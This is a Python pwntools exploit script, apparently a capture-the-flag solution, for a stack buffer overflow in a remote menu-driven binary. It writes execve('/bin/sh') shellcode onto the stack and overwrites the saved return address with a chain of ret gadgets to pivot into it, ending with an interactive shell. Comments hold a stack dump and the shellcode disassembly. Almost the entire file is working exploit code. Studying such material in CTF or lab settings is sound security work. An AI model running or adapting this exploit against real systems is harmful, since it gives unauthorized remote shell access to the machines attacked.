from pwn import *

def finish(p, payload):
    p.recvuntil(b'>>> ')
    p.sendline(b'1')
    p.recvuntil(b'>> ')
    p.sendline(payload)

def loop(p, payload):
    p.recvuntil(b'>>> ')
    p.sendline(b'2')
    p.recvuntil(b'>> ')
    p.sendline(payload)

def main():

    p = remote("ip", port)

    shellcode = b"\x48\x31\xC0\x50\x48\xB8\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x50\x48\x31\xD2\x48\x31\xF6\x48\x89\xE7\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05"
    ret = p64(0x000000000040101a) # address of some ret in the binary

    n = 0x30 # number of bytes between the start of the buffer and saved-rbp

    #pid = util.proc.pidof(p)[0]
    #util.proc.wait_for_debugger(pid)

    loop(p, b'A'*n + shellcode)                  # first payload : writing shellcode @ saved rbp
    loop(p, b'bob')                              # creating a new stackframe for this saved rbp to point towards last rbp, ie. the one with shellcode
    finish(p, b'B'*(n+8) + ret*(n//8) + ret[:5]) # second payload : writing "ret"s from saved eip to next rbp
    # n + 8 => getting to saved rip, (n//8 + 1) rets => getting to next saved rbp

    p.interactive()

    #pid = util.proc.pidof(r)[0]
    #util.proc.wait_for_debugger(pid)


if __name__ == '__main__':
    main()

"""
state of stack after fgets() and inserting A's :

0x7fffffffdcb0:	0x41414141	0x41414141	0xffff000a	0x00007fff
0x7fffffffdcc0:	0x00000000	0x00000000	0xffffde18	0x00007fff
0x7fffffffdcd0:	0xf7ffd000	0x00007fff	0x0040134c	0x00000002 <==== 40134c = saved rip
0x7fffffffdce0:	0xffffdcf0	0x00007fff	0x004014b7	0x00000000
0x7fffffffdcf0:	0x00000001	0x00000000	0xf7ddbcd0	0x00007fff
0x7fffffffdd00:	0xffffddf0	0x00007fff	0x00401440	0x00000000
0x7fffffffdd10:	0x00400040	0x00000001	0xffffde08	0x00007fff
0x7fffffffdd20:	0xffffde08	0x00007fff	0xaa127fed	0xd5909fd2
0x7fffffffdd30:	0x00000000	0x00000000	0xffffde18	0x00007fff
0x7fffffffdd40:	0xf7ffd000	0x00007fff	0x00403df0	0x00000000
0x7fffffffdd50:	0x10107fed	0x2a6f602d	0xd3187fed	0x2a6f7069
0x7fffffffdd60:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffdd70:	0x00000000	0x00000000	0xffffde08	0x00007fff
0x7fffffffdd80:	0x00000001	0x00000000	0xa2102e00	0x3418cdbc
0x7fffffffdd90:	0x00000000	0x00000000	0xf7ddbd8a	0x00007fff
0x7fffffffdda0:	0x00401440	0x00000000	0x00403df0	0x00000000
0x7fffffffddb0:	0xf7ffe2d0	0x00007fff	0x00000000	0x00000000

$rsp   : 0x00007fffffffdcb0  →  "AAAAAAAA\n"
$rbp   : 0x00007fffffffdce0  →  0x00007fffffffdcf0  →  0x0000000000000001
"""

"""shellcode:
0:  48 31 c0                xor    rax,rax
3:  50                      push   rax
4:  48 b8 2f 62 69 6e 2f    movabs rax,0x68732f2f6e69622f
b:  2f 73 68
e:  50                      push   rax
f:  48 31 d2                xor    rdx,rdx
12: 48 31 f6                xor    rsi,rsi
15: 48 89 e7                mov    rdi,rsp
18: 48 c7 c0 3b 00 00 00    mov    rax,0x3b
1f: 0f 05                   syscall
"""
